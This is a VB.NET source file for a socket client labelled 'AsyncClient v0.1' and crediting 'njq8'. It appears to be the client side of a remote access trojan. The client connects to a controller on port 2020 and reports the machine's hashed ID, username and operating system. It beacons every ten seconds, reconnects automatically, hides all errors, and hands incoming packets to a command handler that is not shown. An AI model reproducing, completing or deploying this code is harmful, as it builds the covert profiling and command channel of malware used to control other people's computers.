Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.IO
Public Class ClientSocket

    Public Shared S As Socket
    Public Shared Buffer(1024 * 5000) As Byte
    Public Shared MS As New MemoryStream

    Public Shared EOF As String = "<EOF>"
    Public Shared SPL As String = "<N>"

    Public Shared isConnected As Boolean = False


    Public Shared Sub BeginConnect()

        Try
            Threading.Thread.Sleep(1000)
            S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

            Dim ipAddress As IPAddress = IPAddress.Parse("127.0.0.1")
            Dim ipEndPoint As IPEndPoint = New IPEndPoint(ipAddress, 2020)

            Buffer = New Byte(1024 * 5000) {}
            MS = New MemoryStream

            S.ReceiveBufferSize = 1024 * 5000
            S.SendBufferSize = 1024 * 5000
            S.Connect(ipEndPoint)

            isConnected = True
            Send(Info)

            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)

            While isConnected
                Threading.Thread.Sleep(10 * 1000)
                Send("Alive?")
            End While

        Catch ex As Exception
            Disconnected()
        End Try

    End Sub

    Private Shared Function Info()

        Dim OS As New Devices.ComputerInfo
        Return String.Concat("INFO", SPL, GetHash(ID), SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "AsyncClient v0.1")

    End Function

    Private Shared Sub EndReceive(ByVal ar As IAsyncResult)
        Try
            S = ar.AsyncState
            Dim Received As Integer = S.EndReceive(ar)
            If Received > 0 Then
                MS.Write(Buffer, 0, Received)
                Diagnostics.Debug.WriteLine(String.Format("Received {0}", Received))
re:
                If BS(MS.ToArray).Contains(EOF) Then

                    Dim A As Array = SplitWord(MS.ToArray, EOF)
                    Dim T As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf Messages.Read))
                    T.Start(A(0))

                    MS.Flush()
                    MS.Dispose()
                    MS = New MemoryStream

                    If A.Length = 2 Then
                        MS.Write(A(1), 0, A(1).length)
                        GoTo re
                    End If

                End If
            End If

            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)
        Catch ex As Exception
            isConnected = False
        End Try
    End Sub

    Public Shared Sub Send(ByVal msg As String)
        Try
            Dim M As New MemoryStream
            M.Write(SB(msg), 0, msg.Length)
            M.Write(SB(EOF), 0, EOF.Length)
            S.Poll(-1, SelectMode.SelectWrite)
            S.BeginSend(M.ToArray, 0, M.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), S)
            M.Flush()
            M.Dispose()
        Catch ex As Exception
            Disconnected()
        End Try
    End Sub

    Private Shared Sub EndSend(ByVal ar As IAsyncResult)
        Try
            S.EndSend(ar)
        Catch ex As Exception
        End Try
    End Sub

    Private Shared Sub Disconnected()
        isConnected = False

        Try
            If S IsNot Nothing Then
                S.Close()
                S.Dispose()
                S = Nothing
            End If
        Catch ex As Exception
        End Try

        Try
            If MS IsNot Nothing Then
                MS.Dispose()
                MS = Nothing
            End If
        Catch ex As Exception
        End Try

        BeginConnect()

    End Sub

    'credit to njq8
    'a better way to split packets
    Private Shared Function SplitWord(ByVal b As Byte(), ByVal Word As String) As Array
        Try
            Dim a As New Collections.Generic.List(Of Byte())
            Dim M As New MemoryStream
            Dim MM As New MemoryStream
            Dim T As String() = Split(BS(b), Word)
            M.Write(b, 0, T(0).Length)
            MM.Write(b, T(0).Length + Word.Length, b.Length - (T(0).Length + Word.Length))
            a.Add(M.ToArray)
            a.Add(MM.ToArray)
            M.Dispose()
            MM.Dispose()
            Return a.ToArray
        Catch ex As Exception
        End Try
    End Function

End Class
